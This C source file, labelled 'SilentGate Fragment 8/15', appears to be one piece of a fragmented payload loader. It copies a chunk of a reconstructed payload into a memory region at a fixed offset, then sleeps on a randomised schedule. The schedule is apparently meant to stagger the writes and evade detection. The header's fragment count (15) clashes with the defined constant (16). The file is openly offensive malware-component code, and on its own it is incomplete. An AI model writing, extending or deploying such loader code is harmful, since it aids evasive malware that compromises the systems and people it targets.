/*
 * SilentGate Fragment 8/15
 * Offset: 59888 bytes  Size: 7486 bytes
 * Schedule: t=677ms (Poisson process)
 * Author: JarDani
 */

#include <windows.h>
#include <math.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FRAGMENT_ID   8
#define N_FRAGMENTS   16
#define PAYLOAD_SIZE  119778
#define CHUNK_OFFSET  59888
#define CHUNK_SIZE    7486
#define SLEEP_NEXT_MS 677

/* Forward declaration of reconstructor */
extern unsigned char* sg_reconstruct(int* out_len);


/* Fragment 8: Write chunk 8 */
void sg_execute_fragment_8(PVOID mem) {
    if (!mem) return;
    printf("[FRAG 8] Writing chunk at t=677ms\n");

    int len = 0;
    unsigned char* payload = sg_reconstruct(&len);
    memcpy((BYTE*)mem + CHUNK_OFFSET, payload + CHUNK_OFFSET, CHUNK_SIZE);
    free(payload);

    printf("[FRAG 8] Chunk 8 written at offset %d\n", CHUNK_OFFSET);
    Sleep(SLEEP_NEXT_MS);
}
